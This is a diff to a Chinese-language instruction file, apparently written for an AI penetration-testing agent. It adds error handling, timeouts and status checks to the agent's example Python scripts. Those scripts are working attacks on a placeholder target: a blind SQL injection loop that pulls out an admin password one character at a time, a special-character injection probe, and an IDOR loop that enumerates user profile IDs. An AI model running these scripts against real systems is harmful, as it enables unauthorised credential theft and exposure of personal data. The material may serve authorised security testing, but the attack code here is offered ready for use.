@@ -35,12 +35,18 @@
 
 **重要**: 不要用多个`http_request`来模拟循环
 
+**python_exec 防御性编程约束**: 任何使用 `requests` 发起 HTTP 请求的脚本，**必须**遵守以下规则，否则视为错误脚本：
+1. **状态码检查**: 在读取响应内容前，先检查 `r.status_code`。
+2. **JSON 解析容错**: 不要直接调用 `r.json()`。必须用 `try/except json.JSONDecodeError` 包裹，失败时 fallback 到 `r.text` 进行人工解析或记录原始内容。
+3. **异常捕获**: 网络请求必须用 `try/except` 捕获 `requests.RequestException`，避免单点失败导致整个脚本崩溃。
+4. **超时设置**: 所有 `requests` 调用必须显式设置 `timeout` 参数。
+
 **示例**:
 ```json
 {
   "tool": "python_exec",
   "params": {
-    "code": "import requests\nchars = ['a', 'b', 'c']\nfor char in chars:\n    r = requests.get(f'http://target.com/test?q={char}')\n    print(f'{char}: {r.status_code}')"
+    "code": "import requests, json\nchars = ['a', 'b', 'c']\nfor char in chars:\n    try:\n        r = requests.get(f'http://target.com/test?q={char}', timeout=10)\n        if r.status_code == 200:\n            try:\n                data = r.json()\n                print(f'{char}: JSON ok')\n            except json.JSONDecodeError:\n                print(f'{char}: status=200, not JSON, text={r.text[:100]}')\n        else:\n            print(f'{char}: status={r.status_code}')\n    except requests.RequestException as e:\n        print(f'{char}: request error={e}')"
   }
 }
 ```
@@ -143,10 +149,13 @@ result = ""
 for i in range(1, 20):
     for c in range(32, 127):
         payload = f"admin' AND ASCII(SUBSTR(password,{i},1))={c}--"
-        r = requests.get(f"http://target.com/login?user={payload}")
-        if "Welcome" in r.text:
-            result += chr(c)
-            break
+        try:
+            r = requests.get(f"http://target.com/login?user={payload}", timeout=10)
+            if r.status_code == 200 and "Welcome" in r.text:
+                result += chr(c)
+                break
+        except requests.RequestException as e:
+            print(f"Request error at i={i}, c={c}: {e}")
 print(f"Extracted: {result}")
 ```
 
@@ -160,8 +169,11 @@ print(f"Extracted: {result}")
 import requests
 chars = ["'", '"', '<', '>', '{', '}', ';', '|']
 for char in chars:
-    r = requests.get(f"http://target.com/search?q=test{char}test")
-    print(f"{char}: status={r.status_code}, len={len(r.text)}")
+    try:
+        r = requests.get(f"http://target.com/search?q=test{char}test", timeout=10)
+        print(f"{char}: status={r.status_code}, len={len(r.text)}")
+    except requests.RequestException as e:
+        print(f"{char}: request error={e}")
 ```
 
 ### 参数枚举（IDOR）
@@ -173,9 +185,12 @@ for char in chars:
 ```python
 import requests
 for user_id in range(1, 100):
-    r = requests.get(f"http://target.com/profile?id={user_id}")
-    if r.status_code == 200 and "email" in r.text:
-        print(f"Found: id={user_id}")
+    try:
+        r = requests.get(f"http://target.com/profile?id={user_id}", timeout=10)
+        if r.status_code == 200 and "email" in r.text:
+            print(f"Found: id={user_id}")
+    except requests.RequestException as e:
+        print(f"Error at id={user_id}: {e}")
 ```
 
 ### 单次Payload验证
